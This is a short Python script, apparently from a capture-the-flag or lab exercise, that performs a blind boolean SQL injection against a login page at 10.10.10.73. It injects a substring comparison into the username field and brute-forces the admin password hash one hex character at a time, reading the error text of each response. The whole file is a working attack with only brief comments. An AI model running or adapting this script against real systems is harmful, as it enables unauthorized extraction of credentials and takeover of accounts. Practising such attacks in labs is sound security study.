import requests

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'] # Just hex characters.

def GetSQL(i,c): # Getting proper SQL sintax using the chars. 
    return "admin' and substr(password,%s,1) = '%s'-- -" % (i,c)

for i in range(1,33): # Try to discover the hash
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection, 'password':'password'}
        r = requests.post('http://10.10.10.73/login.php', data = payload)
        if "Wrong identification" in r.text:
            print(c, end='',flush=True)
            break
print()
